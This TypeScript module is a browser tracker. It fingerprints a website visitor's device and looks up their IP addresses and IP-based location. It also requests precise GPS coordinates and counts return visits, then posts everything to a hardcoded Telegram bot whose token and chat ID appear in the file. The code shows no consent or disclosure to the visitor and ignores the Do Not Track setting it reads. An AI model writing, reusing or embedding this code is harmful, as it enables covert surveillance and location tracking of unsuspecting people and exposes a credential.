import Bowser from 'bowser';
import axios from 'axios';

const TELEGRAM_BOT_TOKEN = '7906523257:AAEUrREGq03k0aZ9MnneQBIenqfWPCLqou4';
const TELEGRAM_CHAT_ID = '5464921200';

interface SystemInfo {
  browser: string;
  os: string;
  platform: string;
  userAgent: string;
  ip: {
    v4: string;
    v6: string;
    details: {
      city: string;
      region: string;
      country: string;
      postal: string;
      latitude: number;
      longitude: number;
      timezone: string;
      asn: string;
      org: string;
      isp: string;
    };
  };
  connectionType?: string;
  deviceMemory?: number;
  hardwareConcurrency?: number;
  language: string;
  timeZone: string;
  screenResolution: string;
  battery?: string;
  plugins?: string[];
  doNotTrack?: string;
  cookiesEnabled?: boolean;
  webdriver?: boolean;
  touchPoints?: number;
  vendor?: string;
  gpuInfo?: string;
  networkInfo?: {
    downlink: number;
    effectiveType: string;
    rtt: number;
    saveData: boolean;
  };
  mediaDevices?: {
    audioInputs: number;
    audioOutputs: number;
    videoInputs: number;
  };
  storageQuota?: {
    quota: number;
    usage: number;
  };
  powerPreference?: string;
  colorDepth?: number;
  pixelDepth?: number;
  devicePixelRatio?: number;
  maxTouchPoints?: number;
  hardwareAcceleration?: boolean;
  sessionStorage?: boolean;
  localStorage?: boolean;
  indexedDB?: boolean;
  addressSpace?: string;
  pdfViewerEnabled?: boolean;
  screenOrientation?: string;
  permissions?: Record<string, string>;
}

async function getBatteryInfo() {
  try {
    const battery: any = await (navigator as any).getBattery?.();
    if (battery) {
      return `${(battery.level * 100).toFixed(0)}%, ${battery.charging ? 'Charging' : 'Not charging'}, Time remaining: ${battery.dischargingTime === Infinity ? 'Unknown' : Math.floor(battery.dischargingTime / 60) + ' minutes'}`;
    }
  } catch (e) {}
  return 'Not available';
}

async function getGPUInfo() {
  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (gl) {
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      const vendor = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'Unknown';
      const renderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unknown';
      return `${vendor} - ${renderer}`;
    }
  } catch (e) {}
  return 'Not available';
}

async function getMediaDevices() {
  try {
    const devices = await navigator.mediaDevices.enumerateDevices();
    return {
      audioInputs: devices.filter(d => d.kind === 'audioinput').length,
      audioOutputs: devices.filter(d => d.kind === 'audiooutput').length,
      videoInputs: devices.filter(d => d.kind === 'videoinput').length
    };
  } catch (e) {
    return null;
  }
}

async function getStorageQuota() {
  try {
    if ('storage' in navigator && 'estimate' in navigator.storage) {
      const estimate = await navigator.storage.estimate();
      return {
        quota: estimate.quota,
        usage: estimate.usage
      };
    }
  } catch (e) {}
  return null;
}

async function getPermissions() {
  const permissions = {
    geolocation: 'unknown',
    notifications: 'unknown',
    microphone: 'unknown',
    camera: 'unknown',
    clipboard: 'unknown'
  };

  if ('permissions' in navigator) {
    for (const [name, _] of Object.entries(permissions)) {
      try {
        const status = await navigator.permissions.query({ name: name as PermissionName });
        permissions[name] = status.state;
      } catch (e) {}
    }
  }

  return permissions;
}

function getCanvasFingerprint() {
  try {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    if (ctx) {
      canvas.width = 200;
      canvas.height = 50;
      ctx.textBaseline = 'top';
      ctx.font = '14px Arial';
      ctx.fillStyle = '#f60';
      ctx.fillRect(125,1,62,20);
      ctx.fillStyle = '#069';
      ctx.fillText('Fingerprint', 2, 15);
      ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
      ctx.fillText('Canvas', 4, 17);
      return canvas.toDataURL().slice(-32);
    }
  } catch (e) {}
  return 'Not available';
}

async function getSystemInfo(): Promise<SystemInfo> {
  const browser = Bowser.getParser(window.navigator.userAgent);
  const browserInfo = browser.getBrowser();
  const osInfo = browser.getOS();
  const platformInfo = browser.getPlatform();

  const connection = (navigator as any).connection || 
                    (navigator as any).mozConnection || 
                    (navigator as any).webkitConnection;

  // Get IPv4 and IPv6 addresses using multiple fallback services
  const ipServices = {
    v4: [
      'https://api.ipify.org?format=json',
      'https://api.my-ip.io/ip.json',
      'https://api4.my-ip.io/ip.json'
    ],
    v6: [
      'https://api64.ipify.org?format=json',
      'https://api6.my-ip.io/ip.json'
    ]
  };

  async function tryIpServices(services: string[]) {
    for (const service of services) {
      try {
        const response = await axios.get(service);
        return response.data.ip;
      } catch (e) {
        continue;
      }
    }
    return 'Not available';
  }

  const [ipv4, ipv6] = await Promise.all([
    tryIpServices(ipServices.v4),
    tryIpServices(ipServices.v6)
  ]);

  // Get detailed IP information
  let ipDetails;
  try {
    const detailsResponse = await axios.get(`https://ipapi.co/${ipv4}/json/`);
    ipDetails = detailsResponse.data;
  } catch (e) {
    ipDetails = {
      city: 'Unknown',
      region: 'Unknown',
      country_name: 'Unknown',
      postal: 'Unknown',
      latitude: 0,
      longitude: 0,
      timezone: 'Unknown',
      asn: 'Unknown',
      org: 'Unknown',
      isp: 'Unknown'
    };
  }

  const plugins = Array.from(navigator.plugins).map(plugin => plugin.name);
  const batteryInfo = await getBatteryInfo();
  const gpuInfo = await getGPUInfo();
  const mediaDevices = await getMediaDevices();
  const storageQuota = await getStorageQuota();
  const permissions = await getPermissions();

  const networkInfo = connection ? {
    downlink: connection.downlink,
    effectiveType: connection.effectiveType,
    rtt: connection.rtt,
    saveData: connection.saveData
  } : undefined;

  return {
    browser: `${browserInfo.name} ${browserInfo.version}`,
    os: `${osInfo.name} ${osInfo.version}`,
    platform: platformInfo.type,
    userAgent: window.navigator.userAgent,
    ip: {
      v4: ipv4,
      v6: ipv6,
      details: {
        city: ipDetails.city,
        region: ipDetails.region,
        country: ipDetails.country_name,
        postal: ipDetails.postal,
        latitude: ipDetails.latitude,
        longitude: ipDetails.longitude,
        timezone: ipDetails.timezone,
        asn: ipDetails.asn,
        org: ipDetails.org,
        isp: ipDetails.isp
      }
    },
    connectionType: connection?.type,
    deviceMemory: (navigator as any).deviceMemory,
    hardwareConcurrency: navigator.hardwareConcurrency,
    language: navigator.language,
    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    screenResolution: `${window.screen.width}x${window.screen.height}`,
    battery: batteryInfo,
    plugins: plugins,
    doNotTrack: navigator.doNotTrack,
    cookiesEnabled: navigator.cookieEnabled,
    webdriver: navigator.webdriver,
    touchPoints: navigator.maxTouchPoints,
    vendor: navigator.vendor,
    gpuInfo: gpuInfo,
    networkInfo,
    mediaDevices,
    storageQuota,
    canvas: getCanvasFingerprint(),
    colorDepth: window.screen.colorDepth,
    pixelDepth: window.screen.pixelDepth,
    devicePixelRatio: window.devicePixelRatio,
    maxTouchPoints: navigator.maxTouchPoints,
    hardwareAcceleration: !!(window as any).chrome?.app?.isInstalled,
    sessionStorage: !!window.sessionStorage,
    localStorage: !!window.localStorage,
    indexedDB: !!window.indexedDB,
    addressSpace: (window as any).crossOriginIsolated ? 'cross-origin-isolated' : 'shared',
    pdfViewerEnabled: (navigator as any).pdfViewerEnabled,
    screenOrientation: screen.orientation?.type,
    permissions
  };
}

function requestLocation(): Promise<GeolocationPosition> {
  return new Promise((resolve, reject) => {
    if (!navigator.geolocation) {
      reject(new Error('Geolocation is not supported'));
      return;
    }

    navigator.geolocation.getCurrentPosition(resolve, reject, {
      enableHighAccuracy: true,
      timeout: 5000,
      maximumAge: 0
    });
  });
}

async function sendToTelegram(message: string) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  try {
    await axios.post(url, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'HTML'
    });
  } catch (error) {
    console.error('Failed to send message to Telegram:', error);
  }
}

async function trackUserInfo() {
  try {
    const systemInfo = await getSystemInfo();
    const locationInfo = await requestLocation();
    
    let visitCount = parseInt(localStorage.getItem('visitCount') || '0');
    visitCount++;
    localStorage.setItem('visitCount', visitCount.toString());

    const lastVisit = localStorage.getItem('lastVisit');
    const currentTime = new Date().toISOString();
    localStorage.setItem('lastVisit', currentTime);

    const message = `
🕒 <b>Visit Time:</b> ${new Date().toLocaleString()}
🔍 <b>Visit #${visitCount}</b>
${lastVisit ? `⏱️ <b>Last Visit:</b> ${new Date(lastVisit).toLocaleString()}` : ''}

📱 <b>Device Information:</b>
• Browser: ${systemInfo.browser}
• OS: ${systemInfo.os}
• Platform: ${systemInfo.platform}
• Screen: ${systemInfo.screenResolution}
• GPU: ${systemInfo.gpuInfo}
• CPU Cores: ${systemInfo.hardwareConcurrency}
• Memory: ${systemInfo.deviceMemory}GB
• Battery: ${systemInfo.battery}

🌐 <b>Network Information:</b>
• IPv4: ${systemInfo.ip.v4}
• IPv6: ${systemInfo.ip.v6}
• ISP: ${systemInfo.ip.details.isp}
• Organization: ${systemInfo.ip.details.org}
• ASN: ${systemInfo.ip.details.asn}
• Connection: ${systemInfo.connectionType || 'Unknown'}
• Network Speed: ${systemInfo.networkInfo?.downlink}Mbps
• Network RTT: ${systemInfo.networkInfo?.rtt}ms
• Data Saver: ${systemInfo.networkInfo?.saveData ? 'On' : 'Off'}

📍 <b>Location Information:</b>
• City: ${systemInfo.ip.details.city}
• Region: ${systemInfo.ip.details.region}
• Country: ${systemInfo.ip.details.country}
• Postal: ${systemInfo.ip.details.postal}
• Timezone: ${systemInfo.ip.details.timezone}
• GPS Latitude: ${locationInfo.coords.latitude}
• GPS Longitude: ${locationInfo.coords.longitude}
• GPS Accuracy: ${locationInfo.coords.accuracy}m

⚙️ <b>System Details:</b>
• Language: ${systemInfo.language}
• Color Depth: ${systemInfo.colorDepth}
• Pixel Ratio: ${systemInfo.devicePixelRatio}
• Touch Points: ${systemInfo.touchPoints}
• Hardware Acceleration: ${systemInfo.hardwareAcceleration ? 'Yes' : 'No'}
• Canvas Hash: ${systemInfo.canvas}

🎥 <b>Media Devices:</b>
• Audio Inputs: ${systemInfo.mediaDevices?.audioInputs}
• Audio Outputs: ${systemInfo.mediaDevices?.audioOutputs}
• Video Inputs: ${systemInfo.mediaDevices?.videoInputs}

🔒 <b>Security & Privacy:</b>
• Cookies: ${systemInfo.cookiesEnabled ? 'Enabled' : 'Disabled'}
• Do Not Track: ${systemInfo.doNotTrack || 'Not set'}
• Webdriver: ${systemInfo.webdriver ? 'Yes' : 'No'}

📝 <b>User Agent:</b>
${systemInfo.userAgent}
`;

    await sendToTelegram(message);
    return { systemInfo, locationInfo };
  } catch (error) {
    console.error('Error tracking user info:', error);
    throw error;
  }
}

export {
  sendToTelegram,
  trackUserInfo,
  getSystemInfo,
  requestLocation
};